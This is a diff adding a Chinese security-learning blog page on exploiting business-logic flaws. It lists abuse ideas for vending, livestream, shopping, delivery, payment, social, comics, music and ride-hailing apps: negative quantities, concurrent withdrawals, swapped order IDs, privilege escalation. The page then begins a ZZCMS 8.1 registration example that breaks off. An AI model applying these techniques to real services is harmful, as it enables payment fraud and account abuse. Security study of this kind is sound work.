@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Web安全学习之逻辑漏洞利用 - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-01-24&nbsp;
+  <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span><span> times</span>&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">5.2k</span>
+  
+  <h1 id="Web安全学习之逻辑漏洞利用">Web安全学习之逻辑漏洞利用</h1>
+<h2 id="逻辑漏洞概述">逻辑漏洞概述</h2>
+<p>由于程序逻辑不严谨或逻辑太过复杂，导致一些逻辑分支不能正常处理或处理错误，统称为业务逻辑漏洞。常见的逻辑漏洞有交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等，下图是简单的逻辑漏洞总结，在挖掘的过程中更多的时候需要脑洞大开：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121125603.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
+<p>挖掘逻辑漏洞的过程中，需要一些技巧和非常规思路，有点像边缘测试的思想。一般的思路是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">确定业务流程---&gt;寻找流程中可以被操控的环节---&gt;分析可被操控环节中可能产生的逻辑问题---&gt;尝试修改参数触发逻辑问题</span><br></pre></td></tr></table></figure>
+<h2 id="逻辑漏洞分类">逻辑漏洞分类</h2>
+<ul>
+<li>
+<p>饮料贩卖机</p>
+<ul>
+<li>替换订单ID，创建订单时在支付界面，在此创建订单替换订单ID（高价替换低价）</li>
+<li>无限新用户优惠订单，重复创建优惠订单</li>
+<li>替换优惠卷ID（未达到条件使用）</li>
+<li>个别情况订单数量为1.99时，客户端只支付1元，实际上服务器认为支付了2元。</li>
+<li>取货时并发（真实案例）</li>
+</ul>
+</li>
+<li>
+<p>直播</p>
+<ul>
+<li>快速进出房间炸房</li>
+<li>无限发送点赞协议</li>
+<li>修改礼物数量，0，小数，负数，特定值（一般情况下为1073741824）</li>
+<li>修改礼物ID，遍历尝试是否有隐藏ID。</li>
+<li>并发送礼物，抽奖</li>
+<li>无限创建首次优惠订单，有些首次优惠订单是一个特殊的pid，这种的直接替换pid进行支付。有些是相同的ID，这种的提前创建订单，记录多个订单号在依次修改订单支付。</li>
+<li>刷屏：发言刷屏，分享，点赞等有提示的地方刷屏</li>
+<li>房间内可以申请的地方进行申请取消操作，看看是否能炸房。</li>
+<li>越权踢人，增加管理员，关闭房间等操作。</li>
+<li>发送的表情是否可以修改长宽（真实案例）</li>
+</ul>
+</li>
+<li>
+<p>购物app</p>
+<ul>
+<li>购买数量：为0，小数，负数，正负值（A为-1，B为2，总值为1）</li>
+<li>代金卷：并发领取，遍历领取，同一个代金卷重复使用，未满足条件使用代金卷</li>
+<li>越权：登陆，操作别人订单，修改资料</li>
+</ul>
+</li>
+<li>
+<p>外卖</p>
+<ul>
+<li>商品数量，0，负数，小数，特定值，正负数（A为-1，B为2，总值为1）</li>
+<li>送餐员评价修改，星级，打赏金额（小数，负数）</li>
+<li>商品评价，星级，评论字数，上传图片是否可以自定义格式，</li>
+<li>订单超出送餐地址</li>
+<li>强行货到付款，取消订单，退款</li>
+<li>越权操作别人订单，登陆</li>
+<li>优惠购买会员（重复使用优惠购买）</li>
+</ul>
+</li>
+<li>
+<p>交易平台</p>
+<ul>
+<li>钱包并发提现，负数提现</li>
+<li>使用钱包支付时多个订单并发支付（是否支付金额能大于余额）</li>
+<li>转账负数，并发转账</li>
+<li>上架商品突破限制，例如数量，字数。</li>
+<li>替换订单，创建订单号如果订单状态可修改，先进到支付界面，然后将订单修改成更大的金额，然后支付提前进入的支付界面</li>
+<li>数量修改</li>
+</ul>
+</li>
+<li>
+<p>社交</p>
+<ul>
+<li>强行举报（读取本地消息上传那种）</li>
+<li>强行加好友（一般尝试重发通过好友这条协议）</li>
+<li>自由修改号码（靓号类）</li>
+<li>群管理无限禁言</li>
+<li>越权禁言，替人，拉黑</li>
+<li>会员修改金额，数量。无限优惠购买</li>
+<li>非会员使用会员功能</li>
+</ul>
+</li>
+<li>
+<p>漫画</p>
+<ul>
+<li>打赏金额为负数，小数，特定值（溢出）</li>
+<li>越权删除评论，登陆</li>
+<li>修改充值金额</li>
+<li>付费漫画免费看</li>
+<li>评论图片数量过多会导致客户端加载卡死</li>
+</ul>
+</li>
+<li>
+<p>音乐</p>
+<ul>
+<li>唱歌类软件修改上传分数等参数</li>
+<li>付费下载尝试替换下载ID</li>
+<li>修改付费下载金额</li>
+<li>F12查看下是否有歌曲地址</li>
+</ul>
+</li>
+<li>
+<p>网约车</p>
+<ul>
+<li>无限叫车，重复发送协议造成市场混乱</li>
+<li>修改评价分数</li>
+<li>修改限时优惠叫车关键参数</li>
+<li>替换优惠卷</li>
+<li>越权操作其他订单</li>
+</ul>
+</li>
+</ul>
+<p>业务逻辑漏洞需要对业务熟悉，有很强的逻辑思维能力，所以下面主要描述一下ZZCMS8.1中注册、登录和密码找回出现的漏洞逻辑，再尽量多和全的收集整理相关场景。</p>
+<h2 id="逻辑漏洞利用实例">逻辑漏洞利用实例</h2>
+<h3 id="ZZCMS-8-1">ZZCMS 8.1</h3>
+<h4 id="批量注册">批量注册</h4>
+<p>我们把注册功能填写相关信息，然后抓包：</p>
